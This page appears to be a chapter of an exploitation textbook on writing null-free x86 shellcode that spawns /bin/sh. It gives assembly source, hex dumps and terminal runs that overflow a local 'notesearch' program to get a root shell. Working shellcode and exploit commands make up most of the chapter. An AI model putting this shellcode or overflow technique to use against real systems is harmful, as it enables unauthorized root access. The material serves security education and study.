<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x530 Shell-Spawning Shellcode</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part120.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part122.htm">Next &gt;</a></p><p class="s30" style="padding-left: 37pt;text-indent: 0pt;text-align: left;"><a name="bookmark110">0x530 Shell-Spawning Shellcode</a></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">Now that you’ve learned how to make system calls and avoid null bytes, all sorts of shellcodes can be constructed. To spawn a shell, we just need to make a system call to execute the /bin/sh shell program. System call number 11, <span class="s31">execve()</span>, is similar to the C <span class="s31">execute() </span>function that we used in the previous chapters.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_888.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">EXECVE(2)         Linux Programmer&#39;s Manual         EXECVE(2)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">NAME</p><p class="s31" style="padding-left: 121pt;text-indent: 0pt;text-align: left;">execve - execute program</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">SYNOPSIS</p><p class="s31" style="padding-left: 121pt;text-indent: 0pt;text-align: left;">#include &lt;unistd.h&gt;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 167pt;text-indent: -46pt;text-align: left;">int execve(const char *filename, char *const argv[], char *const envp[]);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">DESCRIPTION</p><p class="s31" style="padding-left: 121pt;text-indent: 0pt;line-height: 106%;text-align: left;">execve() executes the program pointed to by filename. Filename must be either a binary executable, or a script starting with a line of  the form  &quot;#! interpreter [arg]&quot;. In the latter case, the interpreter must be a valid pathname for an executable which is not itself a  script, which will be invoked as interpreter [arg] filename.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 121pt;text-indent: 0pt;line-height: 107%;text-align: left;">argv is an array of argument strings passed to the new program. envp is an array of strings, conventionally of the form key=value, which are</p><p class="s31" style="padding-top: 2pt;padding-bottom: 3pt;padding-left: 121pt;text-indent: 0pt;line-height: 106%;text-align: left;">passed as environment to the new program. Both argv and envp must be terminated by a null pointer. The argument vector and environment can be accessed by the called program&#39;s main function, when it is defined as int main(int argc, char *argv[], char *envp[]).</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_889.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">The first argument of the filename should be a pointer to the string <span class="s31">&quot;/bin/sh&quot;</span>, since this is what we want to execute. The environment array— the third argument—can be empty, but it still need to be terminated with a 32-bit null pointer. The argument array—the second argument—must be null- terminated, too; it must also contain the string pointer (since the zeroth argument is the name of the running program). Done in C, a program making this call would look like this:</p><p class="s40" style="padding-top: 9pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">exec_shell.c</p><p style="text-indent: 0pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_890.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 21pt;text-align: left;">#include &lt;unistd.h&gt; int main() {</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 8pt;text-align: left;">char filename[] = &quot;/bin/sh\x00&quot;;</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">char **argv, **envp; // Arrays that contain char pointers</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">argv[0] = filename; // The only argument is filename. argv[1] = 0; // Null terminate the argument array.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">envp[0] = 0; // Null terminate the environment array.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-left: 99pt;text-indent: 0pt;text-align: left;">execve(filename, argv, envp);</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">}</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_891.png"/></span></p><p style="padding-top: 8pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">To do this in assembly, the argument and environment arrays need to be built in memory. In addition, the <span class="s31">&quot;/bin/sh&quot; </span>string needs to be terminated with a null byte. This must be built in memory as well. Dealing with memory in assembly is similar to using pointers in C. The <span class="s31">lea </span>instruction, whose name stands for <span class="s27">load effective address</span>, works like the <span class="s31">address-of </span>operator in C.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 3pt;text-align: left;"><span><img width="444" height="4" alt="image" src="Image_892.png"/></span></p><p class="s37" style="padding-bottom: 2pt;padding-left: 93pt;text-indent: 0pt;text-align: left;">Instruction      Description</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 2pt;text-align: left;"><span><img width="449" height="3" alt="image" src="Image_893.png"/></span></p><p class="s38" style="padding-bottom: 1pt;padding-left: 176pt;text-indent: -82pt;line-height: 109%;text-align: left;">lea &lt;dest&gt;, &lt;source&gt; <span class="s48">Load the effective address of the source operand into the destination operand.</span></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 2pt;text-align: left;"><span><img width="442" height="3" alt="image" src="Image_894.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">With Intel assembly syntax, operands can be dereferenced as pointers if they are surrounded by square brackets. For example, the following instruction in assembly will treat EBX+12 as a pointer and write <span class="s31">eax </span>to where it’s pointing.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_895.png"/></span></p><p class="s31" style="padding-bottom: 3pt;padding-left: 95pt;text-indent: 0pt;text-align: left;">89 43 0C      mov [ebx+12],eax</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_896.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">The following shellcode uses these new instructions to build the <span class="s31">execve() </span>arguments in memory. The environment array is collapsed into the end of the argument array, so they share the same 32-bit null terminator.</p><p class="s40" style="padding-top: 4pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">exec_shell.s</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_897.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">BITS 32</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 8pt;line-height: 107%;text-align: left;">jmp short two   ; Jump down to the bottom for the call trick. one:</p><p class="s31" style="padding-left: 99pt;text-indent: -8pt;text-align: left;">; int execve(const char *filename, char *const argv [], char *const envp[]) pop ebx     ; Ebx has the addr of the string.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">xor eax, eax   ; Put 0 into eax.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">mov [ebx+7], al  ; Null terminate the /bin/sh string. mov [ebx+8], ebx ; Put addr from ebx where the AAAA is.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 10pt;text-align: left;">mov [ebx+12], eax ; Put 32-bit null terminator where the BBBB is.</p><p class="s46" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">lea ecx, [ebx+8] ; Load the address of [ebx+8] into ecx for argv ptr.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">lea edx, [ebx+12] ; Edx = ebx + 12, which is the envp ptr. mov al, 11    ; Syscall #11</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 10pt;text-align: left;">int 0x80     ; Do it.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">two:</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">call one     ; Use a call to get string address.</p><p class="s31" style="padding-bottom: 3pt;padding-left: 99pt;text-indent: 0pt;text-align: left;">db &#39;/bin/shXAAAABBBB&#39;  ; The XAAAABBBB bytes aren&#39;t needed.</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_898.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">After terminating the string and building the arrays, the shellcode uses the <span class="s31">lea </span>instruction (shown in bold above) to put a pointer to the argument array into the ECX register. Loading the effective address of a bracketed register added to a value is an efficient way to add the value to the register and store the result in another register. In the example above, the brackets dereference EBX+8 as the argument to <span class="s31">lea</span>, which loads that address into EDX. Loading the address of a dereferenced pointer produces the original pointer, so this instruction puts EBX+8 into EDX. Normally, this would require both a <span class="s31">mov </span>and an <span class="s31">add </span>instruction. When assembled, this shellcode is devoid of null bytes. It will spawn a shell when used in an exploit.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_899.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">reader@hacking:~/booksrc $ nasm exec_shell.s reader@hacking:~/booksrc $ wc -c exec_shell 36 exec_shell</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ hexdump -C exec_shell</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000000 eb 16 5b 31 c0 88 43 07 89 5b 08 89 43 0c 8d 4b |..[1..C..[..C..K|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000010  08 8d 53 0c b0 0b cd 80  e8 e5 ff ff ff 2f 62 69  |..S      /bi|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000020  6e 2f 73 68                    |n/sh|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000024</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">reader@hacking:~/booksrc $ export SHELLCODE=$(cat exec_shell) reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./notesearch SHELLCODE will be at 0xbffff9c0</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./notesearch $(perl -e &#39;print &quot;\xc0\xf9\xff\xbf&quot;x40&#39;) [DEBUG] found a 34 byte note for user id 999</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">[DEBUG] found a 41 byte note for user id 999 [DEBUG] found a 5 byte note for user id 999 [DEBUG] found a 35 byte note for user id 999 [DEBUG] found a 9 byte note for user id 999 [DEBUG] found a 33 byte note for user id 999</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">-------[ end of note data ]-------</p><p class="s31" style="padding-top: 2pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">sh-3.2# whoami root</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">sh-3.2#</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_900.png"/></span></p><p style="padding-top: 8pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">This shellcode, however, can be shortened to less than the current 45 bytes. Since shellcode needs to be injected into program memory some-</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">where, smaller shellcode can be used in tighter exploit situations with smaller usable buffers. The smaller the shellcode, the more situations it can be used in. Obviously, the <span class="s31">XAAAABBBB </span>visual aid can be trimmed from the end of the string, which brings the shellcode down to 36 bytes.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_901.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc/shellcodes $ hexdump -C exec_shell</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000000 eb 16 5b 31 c0 88 43 07 89 5b 08 89 43 0c 8d 4b |..[1..C..[..C..K|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000010  08 8d 53 0c b0 0b cd 80  e8 e5 ff ff ff 2f 62 69  |..S      /bi|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000020  6e 2f 73 68                    |n/sh|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000024</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc/shellcodes $ wc -c exec_shell 36 exec_shell</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc/shellcodes $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_902.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">This shellcode can be shrunk down further by redesigning it and using registers more efficiently. The ESP register is the stack pointer, pointing to the top of the stack. When a value is pushed to the stack, ESP is moved up in memory (by subtracting 4) and the value is placed at the top of the stack. When a value is popped from the stack, the pointer in ESP is moved down in memory (by adding 4).</p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">The following shellcode uses <span class="s31">push </span>instructions to build the necessary structures in memory for the <span class="s31">execve() </span>system call.</p><p class="s40" style="padding-top: 9pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">tiny_shell.s</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_903.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">BITS 32</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 99pt;text-indent: -8pt;line-height: 107%;text-align: left;">; execve(const char *filename, char *const argv [], char *const envp[]) xor eax, eax   ; Zero out eax.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">push eax     ; Push some nulls for string termination. push 0x68732f2f  ; Push &quot;//sh&quot; to the stack.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">push 0x6e69622f  ; Push &quot;/bin&quot; to the stack.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">mov ebx, esp   ; Put the address of &quot;/bin//sh&quot; into ebx, via esp. push eax     ; Push 32-bit null terminator to stack.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">mov edx, esp   ; This is an empty array for envp.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">push ebx      ; Push string addr to stack above null terminator. mov ecx, esp    ; This is the argv array with string ptr.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">mov al, 11    ; Syscall #11.</p><p class="s31" style="padding-bottom: 3pt;padding-left: 99pt;text-indent: 0pt;text-align: left;">int 0x80     ; Do it.</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_904.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">This shellcode builds the null-terminated string <span class="s31">&quot;/bin//sh&quot; </span>on the stack, and then copies ESP for the pointer. The extra backslash doesn’t matter and is effectively ignored. The same method is used to build the arrays for the remaining arguments. The resulting shellcode still spawns a shell but is only 25 bytes, compared to 36 bytes using the <span class="s31">jmp </span>call method.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_905.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ nasm tiny_shell.s reader@hacking:~/booksrc $ wc -c tiny_shell 25 tiny_shell</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ hexdump -C tiny_shell</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000000 31 c0 50 68 2f 2f 73 68 68 2f 62 69 6e 89 e3 50 |1.Ph//shh/bin..P|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000010 89 e2 53 89 e1 b0 0b cd 80            |..S   |</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000019</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">reader@hacking:~/booksrc $ export SHELLCODE=$(cat tiny_shell) reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./notesearch SHELLCODE will be at 0xbffff9cb</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./notesearch $(perl -e &#39;print &quot;\xcb\xf9\xff\xbf&quot;x40&#39;) [DEBUG] found a 34 byte note for user id 999</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">[DEBUG] found a 41 byte note for user id 999 [DEBUG] found a 5 byte note for user id 999 [DEBUG] found a 35 byte note for user id 999 [DEBUG] found a 9 byte note for user id 999 [DEBUG] found a 33 byte note for user id 999</p><p class="s31" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">-------[ end of note data ]------- sh-3.2#</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_906.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part120.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part122.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
